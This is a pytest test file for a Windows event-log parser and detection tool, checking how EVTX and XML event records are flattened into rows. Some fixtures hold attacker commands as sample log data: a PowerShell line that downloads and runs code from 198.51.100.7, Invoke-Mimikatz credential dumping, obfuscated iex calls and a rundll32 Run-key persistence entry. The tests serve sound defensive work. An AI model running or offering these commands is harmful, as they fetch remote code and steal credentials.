from __future__ import annotations

import json
from pathlib import Path

import pytest

from services.parsers import evtx_parser
from services.reference import eventids

SAMPLES = Path(__file__).resolve().parents[2] / "samples"


def _sample_event(event_id: int, provider: str, data: dict, user_data: dict | None = None) -> dict:
    ev = {
        "Event": {
            "System": {
                "Provider": {"#attributes": {"Name": provider, "Guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}"}},
                "EventID": event_id,
                "Version": 2,
                "Level": 0,
                "Task": 12544,
                "Opcode": 0,
                "Keywords": "0x8010000000000000",
                "TimeCreated": {"#attributes": {"SystemTime": "2026-09-01T22:13:40.123456Z"}},
                "EventRecordID": 4242,
                "Correlation": {"#attributes": {"ActivityID": "{ABC}"}},
                "Execution": {"#attributes": {"ProcessID": 720, "ThreadID": 1234}},
                "Channel": "Security",
                "Computer": "WS01.corp.local",
                "Security": {"#attributes": {"UserID": "S-1-5-18"}},
            },
            "EventData": data,
        }
    }
    if user_data is not None:
        ev["Event"]["UserData"] = user_data
    return ev


def test_flatten_4625_maps_fields_and_summary():
    ev = _sample_event(
        4625,
        "Microsoft-Windows-Security-Auditing",
        {
            "SubjectUserSid": "S-1-0-0",
            "SubjectUserName": "-",
            "TargetUserName": "administrator",
            "TargetDomainName": "CORP",
            "Status": "0xc000006d",
            "SubStatus": "0xc000006a",
            "LogonType": 3,
            "IpAddress": "10.1.2.3",
            "IpPort": 51234,
            "WorkstationName": "KALI",
            "AuthenticationPackageName": "NTLM",
            "FailureReason": "%%2313",
        },
    )
    row = evtx_parser.flatten(ev, {"event_record_id": 4242, "timestamp": "2026-09-01 22:13:40.123456 UTC"})
    assert row["eventId"] == 4625
    assert row["ts"] == 1788300820123
    assert row["tsIso"] == "2026-09-01T22:13:40.123Z"
    assert row["targetUser"] == "administrator" and row["targetDomain"] == "CORP"
    assert row["ipAddress"] == "10.1.2.3" and row["ipPort"] == 51234
    assert row["logonType"] == 3 and row["logonTypeName"] == "Network"
    assert row["statusText"] == "Wrong password"
    assert row["category"] == "logon"
    assert "Failed logon Network as CORP\\administrator from 10.1.2.3 - Wrong password" == row["summary"]
    assert json.loads(row["raw"])["System"]["EventID"] == 4625
    assert row["subjectUser"] is None  # "-" is normalised away


def test_flatten_classic_event_id_with_qualifiers_and_param_fields():
    ev = _sample_event({"#attributes": {"Qualifiers": 16384}, "#text": 7036}, "Service Control Manager", {"param1": "PSEXESVC", "param2": "running"})
    row = evtx_parser.flatten(ev, None, include_raw=False)
    assert row["eventId"] == 7036 and row["qualifiers"] == 16384
    assert row["serviceName"] == "PSEXESVC" and row["serviceState"] == "running"
    assert "raw" not in row
    assert row["description"] == "Service entered running/stopped state"


def test_flatten_userdata_rdp_and_log_cleared():
    ev = _sample_event(
        21,
        "Microsoft-Windows-TerminalServices-LocalSessionManager",
        {},
        user_data={"EventXML": {"User": "CORP\\bob", "SessionID": 3, "Address": "203.0.113.9"}},
    )
    row = evtx_parser.flatten(ev, None, include_raw=False)
    assert row["targetUser"] == "CORP\\bob" and row["ipAddress"] == "203.0.113.9" and row["sessionId"] == 3
    assert row["category"] == "rdp"
    ev2 = _sample_event(
        1102,
        "Microsoft-Windows-Security-Auditing",
        {},
        user_data={"LogFileCleared": {"SubjectUserName": "eve", "SubjectDomainName": "CORP", "SubjectLogonId": "0x1"}},
    )
    row2 = evtx_parser.flatten(ev2, None, include_raw=False)
    assert row2["subjectUser"] == "eve" and row2["category"] == "log-tampering"
    assert row2["summary"].startswith("The audit log was cleared by CORP\\eve")


def test_flatten_group_event_sets_group_name():
    ev = _sample_event(
        4732,
        "Microsoft-Windows-Security-Auditing",
        {
            "MemberName": "CN=eve,DC=corp",
            "MemberSid": "S-1-5-21-1",
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
            "SubjectUserName": "admin",
        },
    )
    row = evtx_parser.flatten(ev, None, include_raw=False)
    assert row["groupName"] == "Administrators" and row["memberName"] == "CN=eve,DC=corp"


def test_flatten_classic_data_list_becomes_message():
    ev = _sample_event(400, "PowerShell", {"Data": ["Available", "None", "NewEngineState=Available\n\tPreviousEngineState=None"]})
    row = evtx_parser.flatten(ev, None, include_raw=False)
    assert "NewEngineState=Available" in row["message"]


def test_summarize_never_crashes_on_unknown_event_with_task():
    row = {"eventId": 9999, "provider": "Foo", "task": 5}
    assert eventids.summarize(row) == "Event 9999"


@pytest.mark.skipif(not (SAMPLES / "System-last7d.evtx").exists(), reason="local sample not exported")
def test_parse_real_sample_without_errors():
    stats = evtx_parser.Stats()
    rows = list(evtx_parser.iter_events(str(SAMPLES / "System-last7d.evtx"), include_raw=False, stats=stats))
    assert stats.count == len(rows) > 100
    assert stats.errors == 0
    assert stats.first_ts is not None and stats.last_ts >= stats.first_ts
    assert all(r["summary"] for r in rows)
    d = stats.to_dict()
    assert d["channels"].get("System")


@pytest.mark.skipif(not (SAMPLES / "System-last7d.evtx").exists(), reason="local sample not exported")
def test_parse_from_file_object():
    with open(SAMPLES / "System-last7d.evtx", "rb") as fh:
        rows = list(evtx_parser.iter_events(fh, include_raw=False))
    assert len(rows) > 100


def test_the_pe_description_is_not_overwritten_by_the_event_name():
    """Sysmon 1 carries the binary's own Description. It used to be written to the column that also
    holds REMN's name for the event, and overwritten by it, so no rule on it could match."""
    ev = _sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Users\\Public\\m.exe", "Description": "mimikatz for Windows", "Company": "gentilkiwi"})
    row = evtx_parser.flatten(ev, None, include_raw=False)
    assert row["description"] == "Process creation"
    assert row["data"]["Description"] == "mimikatz for Windows"


def test_sigma_description_reads_the_pe_description():
    from services.rules import sigma

    text = "title: t\nlogsource: {product: windows, category: image_load}\ndetection:\n  sel: {Description: st2stager}\n  condition: sel\n"
    rule = sigma.convert_text(text)[0]["rule"]
    assert "data.Description" in json.dumps(rule["where"])


def test_long_command_lines_and_script_blocks_reach_the_rules_whole():
    """An indicator placed after character 4,000 of a command line or script block escaped every
    rule. The rule-searched columns keep the whole text up to 64 KiB."""
    script = "# " + "x" * 5000 + "\nInvoke-Mimikatz -DumpCreds"
    row = evtx_parser.flatten(
        _sample_event(4104, "Microsoft-Windows-PowerShell", {"ScriptBlockText": script, "MessageNumber": 1, "MessageTotal": 1}), None, include_raw=False
    )
    assert row["scriptBlockText"] == script
    cmd = "powershell.exe " + "-NoP " * 900 + "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
    row = evtx_parser.flatten(
        _sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Windows\\powershell.exe", "CommandLine": cmd}), None, include_raw=False
    )
    assert row["commandLine"] == cmd and len(cmd) > 4000


EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"
LOGON_DATA = {
    "SubjectUserSid": "S-1-0-0",
    "SubjectUserName": "-",
    "TargetUserName": "administrator",
    "TargetDomainName": "CORP",
    "Status": "0xc000006d",
    "SubStatus": "0xc000006a",
    "LogonType": "3",
    "IpAddress": "10.1.2.3",
    "IpPort": "51234",
    "WorkstationName": "KALI",
    "AuthenticationPackageName": "NTLM",
    "FailureReason": "%%2313",
}


def _logon_xml(record_id: int = 4242) -> str:
    """The 4625 of _sample_event as wevtutil writes it: one line, single-quoted attributes."""
    data = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in LOGON_DATA.items())
    return (
        f"<Event xmlns='{EVENT_NS}'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{{54849625-5478-4994-A5BA-3E3B0328C30D}}'/>"
        "<EventID>4625</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>"
        "<Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime='2026-09-01T22:13:40.123456Z'/>"
        f"<EventRecordID>{record_id}</EventRecordID><Correlation ActivityID='{{ABC}}'/><Execution ProcessID='720' ThreadID='1234'/>"
        "<Channel>Security</Channel><Computer>WS01.corp.local</Computer><Security UserID='S-1-5-18'/></System>"
        f"<EventData>{data}</EventData></Event>"
    )


# Sysmon 13 as Splunk's XmlWinEventLog keeps it: one record a line, padded between elements
SPLUNK_SYSMON = (
    f'<Event xmlns=\'{EVENT_NS}\'><System><Provider Name="Microsoft-Windows-Sysmon" Guid="5770385F-C22A-43E0-BF4C-06F5698FFBD9">    </Provider>'
    "    <EventID>13</EventID>    <Version>2</Version>    <Level>4</Level>    <Task>13</Task>    <Opcode>0</Opcode>"
    "    <Keywords>0x8000000000000000</Keywords>    <TimeCreated SystemTime='2022-03-17 14:41:33.631836 UTC'>    </TimeCreated>"
    '    <EventRecordID>10577</EventRecordID>    <Correlation>    </Correlation>    <Execution ProcessID="2980" ThreadID="4356">    </Execution>'
    '    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>    <Computer>win10-base</Computer>    <Security UserID="S-1-5-18">    </Security></System>'
    "<EventData><Data Name='RuleName'>-</Data>    <Data Name='EventType'>SetValue</Data>    <Data Name='ProcessGuid'>B50C7A1E-489D-6233-DB14-000000002600</Data>"
    "    <Data Name='Image'>C:\\WINDOWS\\sysWOW64\\wbem\\wmiprvse.exe</Data>"
    "    <Data Name='TargetObject'>HKU\\S-1-5-21-1\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater</Data>"
    "    <Data Name='Details'>c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\x.logs,Defender,1,</Data></EventData></Event>"
)


def _xml_rows(text: bytes) -> tuple[list[dict], evtx_parser.Stats]:
    import io

    stats = evtx_parser.Stats()
    return list(evtx_parser.iter_xml_events(io.BytesIO(text), include_raw=False, stats=stats)), stats


def test_event_records_exported_as_xml_read_as_the_same_rows_as_the_evtx():
    """wevtutil, Event Viewer, Get-WinEvent and a SIEM's XmlWinEventLog export the record's XML. Read
    into the shape pyevtx-rs gives the record, every column and every rule on it is the same."""
    from_evtx = evtx_parser.flatten(_sample_event(4625, "Microsoft-Windows-Security-Auditing", LOGON_DATA), None, include_raw=False)
    (from_xml,), stats = _xml_rows(_logon_xml().encode())
    assert stats.errors == 0
    assert {k: v for k, v in from_xml.items() if k != "data"} == {k: v for k, v in from_evtx.items() if k != "data"}
    assert from_xml["data"] == from_evtx["data"]
    assert from_xml["statusText"] and from_xml["logonType"] == 3 and from_xml["ipAddress"] == "10.1.2.3"


@pytest.mark.parametrize(
    "layout",
    ["wevtutil", "event viewer", "splunk", "powershell utf-16", "chunk boundaries"],
)
def test_every_export_layout_of_event_xml_is_read(layout, monkeypatch):
    records = [_logon_xml(1), SPLUNK_SYSMON]
    if layout == "wevtutil":
        text = "".join(records).encode()
    elif layout == "event viewer":
        text = ('<?xml version="1.0" encoding="UTF-8"?>\r\n<Events>' + "".join(records) + "</Events>").encode()
    elif layout == "powershell utf-16":
        text = "\ufeff" + "\r\n".join(records) + "\r\n"
        text = text.encode("utf-16-le")
    else:
        text = ("\n".join(records) + "\n").encode()
    if layout == "chunk boundaries":
        monkeypatch.setattr(evtx_parser, "_XML_CHUNK", 7)
    assert evtx_parser.looks_like_event_xml(text[:4096])
    rows, stats = _xml_rows(text)
    assert stats.errors == 0
    assert [r["eventId"] for r in rows] == [4625, 13]
    sysmon = rows[1]
    assert sysmon["ts"] == 1647528093631 and sysmon["computer"] == "win10-base" and sysmon["processId"] == 2980
    assert sysmon["targetObject"].endswith("\\CurrentVersion\\Run\\Updater") and "LaunchINFSection" in sysmon["details"]
    # the padding between elements is no value
    assert sysmon["activityId"] is None and sysmon["data"]["RuleName"] == "-"


def test_classic_events_user_data_and_damaged_records_in_event_xml():
    service = (
        f"<Event xmlns='{EVENT_NS}'><System><Provider Name='Service Control Manager' EventSourceName='Service Control Manager'/>"
        "<EventID Qualifiers='16384'>7036</EventID><Level>4</Level><TimeCreated SystemTime='2026-09-01T10:00:00.000Z'/>"
        "<EventRecordID>7</EventRecordID><Channel>System</Channel><Computer>WS01</Computer><Security/></System>"
        "<EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>running</Data><Binary>770075</Binary></EventData>"
        "<RenderingInfo Culture='en-US'><Message>The Windows Update service entered the running state.</Message></RenderingInfo></Event>"
    )
    cleared = (
        f"<Event xmlns='{EVENT_NS}'><System><Provider Name='Microsoft-Windows-Eventlog'/><EventID>1102</EventID>"
        "<TimeCreated SystemTime='2026-09-01T10:01:00.000Z'/><EventRecordID>8</EventRecordID><Channel>Security</Channel><Computer>WS01</Computer></System>"
        "<UserData><LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>"
        "<SubjectUserSid>S-1-5-21-1-1108</SubjectUserSid><SubjectUserName>admin01</SubjectUserName><SubjectDomainName>EXAMPLE</SubjectDomainName>"
        "</LogFileCleared></UserData></Event>"
    )
    classic = (
        f"<Event xmlns='{EVENT_NS}'><System><Provider Name='MSSQLSERVER'/><EventID Qualifiers='49152'>18456</EventID>"
        "<TimeCreated SystemTime='2026-09-01T10:02:00.000Z'/><EventRecordID>9</EventRecordID><Channel>Application</Channel><Computer>SQL01</Computer></System>"
        "<EventData><Data>sa</Data><Data> Reason: Password did not match that for the login provided.</Data><Data> [CLIENT: 10.0.2.17]</Data></EventData></Event>"
    )
    # a control character XML does not allow, and a record cut off inside a tag
    control = _logon_xml(10).replace("KALI", "KA\x02LI")
    broken = _logon_xml(11).replace("<EventRecordID>", "<EventRecordID", 1)
    rows, stats = _xml_rows("\n".join([service, cleared, classic, control, broken, _logon_xml(12)]).encode())
    assert [r["recordId"] for r in rows] == [7, 8, 9, 10, 12]
    assert stats.errors == 1
    svc, log, sql, odd, _ = rows
    assert (svc["qualifiers"], svc["serviceName"], svc["serviceState"]) == (16384, "Windows Update", "running")
    assert log["data"]["_userDataType"] == "LogFileCleared" and log["subjectUser"] == "admin01"
    assert sql["qualifiers"] == 49152 and "[CLIENT: 10.0.2.17]" in sql["message"]
    assert odd["workstation"] == "KA\ufffdLI"


def test_other_xml_is_no_event_export():
    assert not evtx_parser.looks_like_event_xml(b'<?xml version="1.0" encoding="UTF-16"?>\r\n<Task version="1.2"></Task>')
    assert not evtx_parser.looks_like_event_xml(b"<Objs Version='1.1.0.1'></Objs>")
    assert not evtx_parser.looks_like_event_xml(b"<EventData><Data>x</Data></EventData>")
    assert not evtx_parser.looks_like_event_xml(b"2026-09-01 10:00:00 <Event> in a text log")


def test_what_an_exporter_left_unescaped_in_event_xml_is_read_and_counted():
    """Some SIEM exports write a value as it is: an ampersand, a PowerShell block comment, a task's
    own XML. Such a record is read with those escaped and counted; one whose tags are broken is not."""
    base = (
        f"<Event xmlns='{EVENT_NS}'><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>{{eid}}</EventID>"
        "<TimeCreated SystemTime='2026-09-01T10:00:00.000Z'/><EventRecordID>{n}</EventRecordID><Channel>Security</Channel><Computer>WS01</Computer></System>"
        "<EventData>{data}</EventData></Event>"
    )
    amp = base.format(eid=4688, n=1, data="<Data Name='CommandLine'>powershell -c \"$a=1;&($ShellId[1] + 'ex') $t\" &amp; done</Data>")
    comment = base.format(eid=4688, n=2, data="<Data Name='CommandLine'>powershell -c \"<# note #> iex $x; if (1 -lt 2) {}\"</Data>")
    task = base.format(
        eid=4698,
        n=3,
        data="<Data Name='TaskName'>\\Updater</Data><Data Name='TaskContent'><?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>C:\\Users\\Public\\u.exe</Command></Exec></Actions></Task></Data>",
    )
    broken = base.format(eid=4688, n=4, data="<Data Name='CommandLine'>wmic os get /format:list</fData>")
    rows, stats = _xml_rows("\n".join([amp, comment, task, broken]).encode())
    assert [r["recordId"] for r in rows] == [1, 2, 3]
    assert (stats.repaired, stats.errors) == (3, 1)
    assert rows[0]["commandLine"] == "powershell -c \"$a=1;&($ShellId[1] + 'ex') $t\" & done"
    assert rows[1]["commandLine"].startswith('powershell -c "<# note #> iex')
    assert rows[2]["taskContent"].startswith('<?xml version="1.0" encoding="UTF-16"?><Task>') and "u.exe</Command>" in rows[2]["taskContent"]
    assert stats.to_dict()["repaired"] == 3
